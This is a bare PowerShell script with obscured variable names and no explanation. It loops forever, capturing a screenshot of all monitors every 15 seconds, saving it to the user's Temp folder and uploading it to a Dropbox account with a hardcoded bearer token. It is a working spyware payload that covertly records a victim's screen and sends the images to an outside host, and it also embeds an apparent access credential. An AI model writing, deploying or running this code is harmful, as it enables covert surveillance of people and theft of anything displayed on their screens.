function d { 
    [CmdletBinding()] 
    param ( 
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)] 
        [Alias("x")] 
        [string]$a 
    ) 
    $b = "sl.u.AFyrNZWrgIKRtHAzCUwTGrFZ09f2imgCwuBj3yr3kDHyiu2AQBJjzii4vxIcUKPeyJgrsCkE8f93HkLAby-r3lIUrcj7uN5WGpyDeh7KSxfU4HPeVDG9mJkKamY73kx2s45TjXpRd8oxnaExUfcSmn3w47RBJ_dKy14zcyv9K_CrxKnO0k_e1OsY_uYK1WhBeq_AJ1KmmDVETTJoGvrgZzD6VPIIpOSysS1uhimzVoAvvOrCBgrehFJ0-OTD3AI5E9E9pBStwP_wm4NzUckCAW5lY7oWAZ35jxDRXNqtLclosOOaRE9_W17neaqVrYXtCng7A2zAZiZauUpX9bSf8yCB1hqoDAhYPG93QskAkITulDMl9qXjdRbubjxdsS-nMwTby0J9mDrK9syovivmX6DSV2ouQqgsVadNHoIjsb-qgubhaJymKT6Ys_lr7I8UpaleYJz3DHblNNFemmlf_-xg9nMYlV5NsA9TqQzNtpq4ZRu-Py9MQoTQLaBpnm7GOAXx1R80Lyd5K_A43VyKKEpBQ-x1Z25xZNvKzuITBeY1dj5sVtPChY_UWRIvID_-0AA0p7O3_bjGc-1Zl_1g8jlyVfd-7hJKI8pv7loFSeKTRaFfcRVFlnMDgULreQoMTpow9GK1fwXzC6KEDzcr_2oCNyt7mg5mkTIxZgZ0nonvJl-_evHdKwcUG_hzizoEIYlNC-EB6OJGKpAD_52T9-N5YmagxsBMMq6lJvy6rNGzsGHL6GbGb6dkUnT2k5eMLwERwmRiNBDw6sjcSY1YkrKBRINYEAlETBvFDs4E-1kP4_6s4cUeQi0x1MMRKTV-BbC8B-lx35prmFYygYbJm-S11hFtfP3LpDGRLtINjgenIerk-WecABhnbBpnpyY9UKFEZstIMOfG5DjLvWEEr5lVUUVb-U22d_qeJp3ucIphLbfX-_trf2B88dPbSpGhznT-o12t5W9WFZc0yfR_Fua2F4lj5KrvbIYidzYatEDor3rcaraPdN8RW2CU7s2VK3tG5kslm3IcnMlQpf0HB7WcvFBnEe3x36_ryCR5BcKrFuZsdRQjCFz6ftH56hDjtOdTQUVrFlvKuuY4fU27i3nbgu_hqPBCgZPISokWi2-cz87tdz0SA9EcT6gbOcdIdyBAJCRuAo6rQHFV663Dpc9hVuLJAfmGBgMeFCSLYT6MYKf9iarg5luW9f05Vvr9QASb5A71u72KoHOHJOqAAA1XoCIiWAfMqoqjvawVXx9nofPtgLsd4HQMgULeJJnfbFdEGwgQG-EmTUKgWVbJpAtrr_s5wSo6F8AsHdX2yf49nCJO3KV6xED2iUBOWwdluyWPinw8fbv_cNlu6OLLaUKYaCRdqnyLsiaygAGTCnOB-neGidrt1LYNJ5zP1s59vT7nPVncMaRDbqs1E8FRbnQX" 
    $c = Split-Path $a -leaf 
    $d = "/$c" 
    $e = '{ "path": "' + $d + '", "mode": "add", "autorename": true, "mute": false }' 
    $f = "Bearer " + $b 
    $g = New-Object "System.Collections.Generic.Dictionary[[String],[String]]" 
    $g.Add("Authorization", $f) 
    $g.Add("Dropbox-API-Arg", $e) 
    $g.Add("Content-Type", 'application/octet-stream') 
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $a -Headers $g 
} 

while(1){ 
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing 
    $s = [Windows.Forms.Screen]::AllScreens 
    $t = ($s.Bounds.Top | Measure-Object -Minimum).Minimum 
    $l = ($s.Bounds.Left | Measure-Object -Minimum).Minimum 
    $w = ($s.Bounds.Right | Measure-Object -Maximum).Maximum 
    $h = ($s.Bounds.Bottom | Measure-Object -Maximum).Maximum 
    $z = [Drawing.Rectangle]::FromLTRB($l, $t, $w, $h) 
    $i = New-Object System.Drawing.Bitmap ([int]$z.Width), ([int]$z.Height) 
    $j = [Drawing.Graphics]::FromImage($i) 
    $j.CopyFromScreen($z.Location, [Drawing.Point]::Empty, $z.Size) 
    $k = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-C.png" 
    $i.Save($k) 
    $j.Dispose() 
    $i.Dispose() 
    Start-Sleep -Seconds 15 
    $k | d 
}
